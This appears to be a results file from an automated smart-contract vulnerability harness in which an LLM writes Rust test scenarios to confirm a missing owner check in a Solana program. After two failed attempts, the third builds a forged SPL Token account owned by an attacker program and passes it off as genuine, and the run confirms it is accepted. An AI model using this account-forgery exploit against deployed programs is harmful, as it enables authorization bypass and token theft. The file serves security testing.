@@ -1,0 +1,232 @@
+{
+  "category": "OWNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta forjada aceita: dono e o programa malicioso; conta forjada aceita: dono diferente do SPL Token Program",
+  "attempts_used": 3,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2275,
+        "completion_tokens": 910,
+        "latency_s": 6.2
+      },
+      "raw": "{\n  \"plan\": \"O programa `log_message` recebe uma conta `token` como `AccountInfo` generica e desserializa com `SplTokenAccount::unpack` sem verificar o dono. O baseline usa uma conta SPL Token real (dono = SPL Token Program) cujo campo `owner` e a authority, provando que o cenario esta correto. O ataque substitui a conta `token` por uma conta forjada pertencente a um programa malicioso, com dados que desserializam como `SplTokenAccount` e campo `owner` igual a authority. O efeito medido e que a instrucao aceita a conta forjada (execucao bem-sucedida) e a conta resultante tem dono diferente do SPL Token Program, demonstrando a falha de validacao de propriedade.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker_program = Pubkey::new_unique();\\n\\n// Conta SPL Token legitima: dono = SPL Token Program, dados com owner = authority\\nlet spl_token_program = Pubkey::new_unique(); // apenas para o baseline, nao precisa ser o real\\nlet mut legit_token_data = vec![0u8; 165];\\nlegit_token_data[0..32].copy_from_slice(&authority.to_bytes()); // campo owner do SplTokenAccount\\nlet legit_token = account(&spl_token_program, &legit_token_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\n\\nlet contas_baseline = vec![\\n    (env.program_id, account(&env.program_id, &[], None)), // placeholder, nao usado\\n];\\n\\n// Baseline: token legitimo com owner = authority\\nlet ix_baseline = env.anchor_ix(\\\"log_message\\\", &(), vec![\\n    AccountMeta::new_readonly(legit_token_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\n\\n// Precisamos das chaves das contas\\nlet legit_token_key = Pubkey::new_unique();\\nlet contas_baseline = vec![\\n    (legit_token_key, legit_token),\\n    (authority, authority_account),\\n];\\n\\nlet r_baseline = env.baseline(\\\"uso legitimo: token SPL real com owner = authority\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: conta forjada pertencente a programa malicioso, dados que desserializam como SplTokenAccount com owner = authority\\nlet forged_token_key = Pubkey::new_unique();\\nlet mut forged_data = vec![0u8; 165];\\nforged_data[0..32].copy_from_slice(&authority.to_bytes()); // owner = authority\\nlet forged_token = account(&attacker_program, &forged_data, None);\\n\\nlet ix_attack = env.anchor_ix(\\\"log_message\\\", &(), vec![\\n    AccountMeta::new_readonly(forged_token_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\n\\nlet contas_attack = vec![\\n    (forged_token_key, forged_token),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r_attack = env.attack(\\\"token forjado com dono malicioso e owner = authority\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let forged_after = after(&r_attack, &forged_token_key);\\n    env.effect(\\\"conta forjada aceita: dono diferente do SPL Token Program\\\", forged_after.owner() != &spl_token_program);\\n    env.effect(\\\"conta forjada aceita: dono e o programa malicioso\\\", forged_after.owner() == &attacker_program);\\n}\"\n}",
+      "plan": "O programa `log_message` recebe uma conta `token` como `AccountInfo` generica e desserializa com `SplTokenAccount::unpack` sem verificar o dono. O baseline usa uma conta SPL Token real (dono = SPL Token Program) cujo campo `owner` e a authority, provando que o cenario esta correto. O ataque substitui a conta `token` por uma conta forjada pertencente a um programa malicioso, com dados que desserializam como `SplTokenAccount` e campo `owner` igual a authority. O efeito medido e que a instrucao aceita a conta forjada (execucao bem-sucedida) e a conta resultante tem dono diferente do SPL Token Program, demonstrando a falha de validacao de propriedade.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker_program = Pubkey::new_unique();\n\n// Conta SPL Token legitima: dono = SPL Token Program, dados com owner = authority\nlet spl_token_program = Pubkey::new_unique(); // apenas para o baseline, nao precisa ser o real\nlet mut legit_token_data = vec![0u8; 165];\nlegit_token_data[0..32].copy_from_slice(&authority.to_bytes()); // campo owner do SplTokenAccount\nlet legit_token = account(&spl_token_program, &legit_token_data, None);\n\nlet authority_account = wallet(1_000_000_000);\n\nlet contas_baseline = vec![\n    (env.program_id, account(&env.program_id, &[], None)), // placeholder, nao usado\n];\n\n// Baseline: token legitimo com owner = authority\nlet ix_baseline = env.anchor_ix(\"log_message\", &(), vec![\n    AccountMeta::new_readonly(legit_token_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\n\n// Precisamos das chaves das contas\nlet legit_token_key = Pubkey::new_unique();\nlet contas_baseline = vec![\n    (legit_token_key, legit_token),\n    (authority, authority_account),\n];\n\nlet r_baseline = env.baseline(\"uso legitimo: token SPL real com owner = authority\", &ix_baseline, &contas_baseline);\n\n// Ataque: conta forjada pertencente a programa malicioso, dados que desserializam como SplTokenAccount com owner = authority\nlet forged_token_key = Pubkey::new_unique();\nlet mut forged_data = vec![0u8; 165];\nforged_data[0..32].copy_from_slice(&authority.to_bytes()); // owner = authority\nlet forged_token = account(&attacker_program, &forged_data, None);\n\nlet ix_attack = env.anchor_ix(\"log_message\", &(), vec![\n    AccountMeta::new_readonly(forged_token_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\n\nlet contas_attack = vec![\n    (forged_token_key, forged_token),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r_attack = env.attack(\"token forjado com dono malicioso e owner = authority\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let forged_after = after(&r_attack, &forged_token_key);\n    env.effect(\"conta forjada aceita: dono diferente do SPL Token Program\", forged_after.owner() != &spl_token_program);\n    env.effect(\"conta forjada aceita: dono e o programa malicioso\", forged_after.owner() == &attacker_program);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `legit_token_key` in this scope\n  --> tests/attempt.rs:26:35\n   |\n26 |         AccountMeta::new_readonly(legit_token_key, false),\n   |                                   ^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n26 -         AccountMeta::new_readonly(legit_token_key, false),\n26 +         AccountMeta::new_readonly(legit_token, false),\n   |\n\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `legit_token_key` in this scope\n  --> tests/attempt.rs:26:35\n   |\n26 |         AccountMeta::new_readonly(legit_token_key, false),\n   |                                   ^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n26 -         AccountMeta::new_readonly(legit_token_key, false),\n26 +         AccountMeta::new_readonly(legit_token, false),\n   |\n\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3109,
+        "completion_tokens": 899,
+        "latency_s": 5.4
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta SPL Token legítima (dono = SPL Token Program real, dados de 165 bytes com owner = authority) e uma authority signer. O baseline chama log_message com essa conta legítima e deve ter sucesso. O ataque substitui a conta token por uma conta forjada pertencente a um programa malicioso, com os mesmos dados (owner = authority), e a passa como token. O efeito mede que a conta forjada foi aceita: seu dono é o programa malicioso, diferente do SPL Token Program.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker_program = Pubkey::new_unique();\\n\\n// SPL Token Program real (endereco canonico)\\nlet spl_token_program = Pubkey::new_from_array([\\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\\n]);\\n\\n// Conta SPL Token legitima: dono = SPL Token Program, dados com owner = authority\\nlet legit_token_key = Pubkey::new_unique();\\nlet mut legit_token_data = vec![0u8; 165];\\nlegit_token_data[0..32].copy_from_slice(&authority.to_bytes()); // campo owner do SplTokenAccount\\nlet legit_token = account(&spl_token_program, &legit_token_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\n\\nlet contas_baseline = vec![\\n    (legit_token_key, legit_token),\\n    (authority, authority_account),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\\"log_message\\\", &(), vec![\\n    AccountMeta::new_readonly(legit_token_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\n\\nlet r_baseline = env.baseline(\\\"uso legitimo: token SPL real com owner = authority\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: conta forjada pertencente a programa malicioso, dados que desserializam como SplTokenAccount com owner = authority\\nlet forged_token_key = Pubkey::new_unique();\\nlet mut forged_data = vec![0u8; 165];\\nforged_data[0..32].copy_from_slice(&authority.to_bytes()); // owner = authority\\nlet forged_token = account(&attacker_program, &forged_data, None);\\n\\nlet ix_attack = env.anchor_ix(\\\"log_message\\\", &(), vec![\\n    AccountMeta::new_readonly(forged_token_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\n\\nlet contas_attack = vec![\\n    (forged_token_key, forged_token),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r_attack = env.attack(\\\"token forjado com dono malicioso e owner = authority\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let forged_after = after(&r_attack, &forged_token_key);\\n    env.effect(\\\"conta forjada aceita: dono e o programa malicioso\\\", forged_after.owner() == &attacker_program);\\n    env.effect(\\\"conta forjada aceita: dono diferente do SPL Token Program\\\", forged_after.owner() != &spl_token_program);\\n}\"\n}",
+      "plan": "Preparo uma conta SPL Token legítima (dono = SPL Token Program real, dados de 165 bytes com owner = authority) e uma authority signer. O baseline chama log_message com essa conta legítima e deve ter sucesso. O ataque substitui a conta token por uma conta forjada pertencente a um programa malicioso, com os mesmos dados (owner = authority), e a passa como token. O efeito mede que a conta forjada foi aceita: seu dono é o programa malicioso, diferente do SPL Token Program.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker_program = Pubkey::new_unique();\n\n// SPL Token Program real (endereco canonico)\nlet spl_token_program = Pubkey::new_from_array([\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\n]);\n\n// Conta SPL Token legitima: dono = SPL Token Program, dados com owner = authority\nlet legit_token_key = Pubkey::new_unique();\nlet mut legit_token_data = vec![0u8; 165];\nlegit_token_data[0..32].copy_from_slice(&authority.to_bytes()); // campo owner do SplTokenAccount\nlet legit_token = account(&spl_token_program, &legit_token_data, None);\n\nlet authority_account = wallet(1_000_000_000);\n\nlet contas_baseline = vec![\n    (legit_token_key, legit_token),\n    (authority, authority_account),\n];\n\nlet ix_baseline = env.anchor_ix(\"log_message\", &(), vec![\n    AccountMeta::new_readonly(legit_token_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\n\nlet r_baseline = env.baseline(\"uso legitimo: token SPL real com owner = authority\", &ix_baseline, &contas_baseline);\n\n// Ataque: conta forjada pertencente a programa malicioso, dados que desserializam como SplTokenAccount com owner = authority\nlet forged_token_key = Pubkey::new_unique();\nlet mut forged_data = vec![0u8; 165];\nforged_data[0..32].copy_from_slice(&authority.to_bytes()); // owner = authority\nlet forged_token = account(&attacker_program, &forged_data, None);\n\nlet ix_attack = env.anchor_ix(\"log_message\", &(), vec![\n    AccountMeta::new_readonly(forged_token_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\n\nlet contas_attack = vec![\n    (forged_token_key, forged_token),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r_attack = env.attack(\"token forjado com dono malicioso e owner = authority\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let forged_after = after(&r_attack, &forged_token_key);\n    env.effect(\"conta forjada aceita: dono e o programa malicioso\", forged_after.owner() == &attacker_program);\n    env.effect(\"conta forjada aceita: dono diferente do SPL Token Program\", forged_after.owner() != &spl_token_program);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "uso legitimo: token SPL real com owner = authority",
+            "result": "Failure(UninitializedAccount)",
+            "compute_units": 2259,
+            "account_flags": "-r,sr",
+            "ix_head": "94042c22ca055373",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000002",
+                "digest": "707c4c172204a67b",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "token forjado com dono malicioso e owner = authority",
+            "result": "Failure(UninitializedAccount)",
+            "compute_units": 2259,
+            "account_flags": "-r,sr",
+            "ix_head": "94042c22ca055373",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": false,
+                "owner": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "data_len": 165,
+                "head": "0000000000000002",
+                "digest": "707c4c172204a67b",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 2259 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: instruction requires an initialized account",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 2259 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: instruction requires an initialized account"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'uso legitimo: token SPL real com owner = authority' falhou com Failure(UninitializedAccount); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3069,
+        "completion_tokens": 933,
+        "latency_s": 5.02
+      },
+      "raw": "{\"plan\": \"O baseline falhou com UninitializedAccount porque a conta SPL Token precisa ter o campo state (offset 108) igual a 1 (Initialized) para que unpack funcione. Vou montar uma conta SPL Token legitima com layout completo (mint, owner, amount, state=1) e dono = SPL Token Program, e uma authority que assina. O ataque usa uma conta com os mesmos dados validos mas dono = programa malicioso, contornando a checagem de propriedade. O efeito mede que a conta forjada foi aceita com dono diferente do SPL Token Program.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker_program = Pubkey::new_unique();\\n\\nlet spl_token_program = Pubkey::new_from_array([\\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\\n]);\\n\\n// Layout SPL Token Account (165 bytes):\\n// mint(32) owner(32) amount(8) delegate(36) state(1) is_native(12) delegated_amount(8) close_authority(36)\\nlet mint = Pubkey::new_unique();\\nlet mut token_data = vec![0u8; 165];\\ntoken_data[0..32].copy_from_slice(&mint.to_bytes());\\ntoken_data[32..64].copy_from_slice(&authority.to_bytes()); // owner = authority\\ntoken_data[64..72].copy_from_slice(&0u64.to_le_bytes()); // amount\\ntoken_data[108] = 1; // state = Initialized\\n\\nlet legit_token_key = Pubkey::new_unique();\\nlet legit_token = account(&spl_token_program, &token_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\n\\nlet contas_baseline = vec![\\n    (legit_token_key, legit_token),\\n    (authority, authority_account),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\\"log_message\\\", &(), vec![\\n    AccountMeta::new_readonly(legit_token_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\n\\nlet r_baseline = env.baseline(\\\"uso legitimo: token SPL real com owner = authority\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: mesmos dados validos, mas dono = programa malicioso\\nlet forged_token_key = Pubkey::new_unique();\\nlet forged_token = account(&attacker_program, &token_data, None);\\n\\nlet ix_attack = env.anchor_ix(\\\"log_message\\\", &(), vec![\\n    AccountMeta::new_readonly(forged_token_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\n\\nlet contas_attack = vec![\\n    (forged_token_key, forged_token),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r_attack = env.attack(\\\"token forjado com dono malicioso e owner = authority\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let forged_after = after(&r_attack, &forged_token_key);\\n    env.effect(\\\"conta forjada aceita: dono e o programa malicioso\\\", forged_after.owner() == &attacker_program);\\n    env.effect(\\\"conta forjada aceita: dono diferente do SPL Token Program\\\", forged_after.owner() != &spl_token_program);\\n}\"}",
+      "plan": "O baseline falhou com UninitializedAccount porque a conta SPL Token precisa ter o campo state (offset 108) igual a 1 (Initialized) para que unpack funcione. Vou montar uma conta SPL Token legitima com layout completo (mint, owner, amount, state=1) e dono = SPL Token Program, e uma authority que assina. O ataque usa uma conta com os mesmos dados validos mas dono = programa malicioso, contornando a checagem de propriedade. O efeito mede que a conta forjada foi aceita com dono diferente do SPL Token Program.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker_program = Pubkey::new_unique();\n\nlet spl_token_program = Pubkey::new_from_array([\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\n]);\n\n// Layout SPL Token Account (165 bytes):\n// mint(32) owner(32) amount(8) delegate(36) state(1) is_native(12) delegated_amount(8) close_authority(36)\nlet mint = Pubkey::new_unique();\nlet mut token_data = vec![0u8; 165];\ntoken_data[0..32].copy_from_slice(&mint.to_bytes());\ntoken_data[32..64].copy_from_slice(&authority.to_bytes()); // owner = authority\ntoken_data[64..72].copy_from_slice(&0u64.to_le_bytes()); // amount\ntoken_data[108] = 1; // state = Initialized\n\nlet legit_token_key = Pubkey::new_unique();\nlet legit_token = account(&spl_token_program, &token_data, None);\n\nlet authority_account = wallet(1_000_000_000);\n\nlet contas_baseline = vec![\n    (legit_token_key, legit_token),\n    (authority, authority_account),\n];\n\nlet ix_baseline = env.anchor_ix(\"log_message\", &(), vec![\n    AccountMeta::new_readonly(legit_token_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\n\nlet r_baseline = env.baseline(\"uso legitimo: token SPL real com owner = authority\", &ix_baseline, &contas_baseline);\n\n// Ataque: mesmos dados validos, mas dono = programa malicioso\nlet forged_token_key = Pubkey::new_unique();\nlet forged_token = account(&attacker_program, &token_data, None);\n\nlet ix_attack = env.anchor_ix(\"log_message\", &(), vec![\n    AccountMeta::new_readonly(forged_token_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\n\nlet contas_attack = vec![\n    (forged_token_key, forged_token),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r_attack = env.attack(\"token forjado com dono malicioso e owner = authority\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let forged_after = after(&r_attack, &forged_token_key);\n    env.effect(\"conta forjada aceita: dono e o programa malicioso\", forged_after.owner() == &attacker_program);\n    env.effect(\"conta forjada aceita: dono diferente do SPL Token Program\", forged_after.owner() != &spl_token_program);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "uso legitimo: token SPL real com owner = authority",
+            "result": "Success",
+            "compute_units": 1678,
+            "account_flags": "-r,sr",
+            "ix_head": "94042c22ca055373",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": false,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "94f076f4c02cbf88",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "token forjado com dono malicioso e owner = authority",
+            "result": "Success",
+            "compute_units": 1678,
+            "account_flags": "-r,sr",
+            "ix_head": "94042c22ca055373",
+            "accounts": [
+              {
+                "key": "11111113R2cuenjG5nFubqX9Wzuukdin2YfGQVzu5",
+                "signer": false,
+                "writable": false,
+                "owner": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "94f076f4c02cbf88",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "conta forjada aceita: dono e o programa malicioso",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "conta forjada aceita: dono diferente do SPL Token Program",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1678 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1678 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta forjada aceita: dono e o programa malicioso; conta forjada aceita: dono diferente do SPL Token Program"
+    }
+  ],
+  "case_id": "SL-02-INS",
+  "static_finding": {
+    "category": "OWNER",
+    "confidence": "high",
+    "evidence": "token: AccountInfo<'info>,\n...\nlet token = SplTokenAccount::unpack(&ctx.accounts.token.data.borrow())?;",
+    "explanation": "A conta `token` e recebida como `AccountInfo` generica e seus dados sao desserializados com `SplTokenAccount::unpack` sem verificar se `ctx.accounts.token.owner` e o programa SPL Token. Um atacante pode fornecer uma conta cujos dados foram forjados por outro programa, fazendo `unpack` produzir um `owner` arbitrario.",
+    "attack_hypothesis": "O atacante cria uma conta pertencente a um programa malicioso com dados que desserializam como um `SplTokenAccount` cujo campo `owner` e a chave publica do atacante, e a passa como `token`; a checagem `authority.key != &token.owner` passa a ser satisfeita com uma conta forjada, contornando a validacao de propriedade do token."
+  }
+}
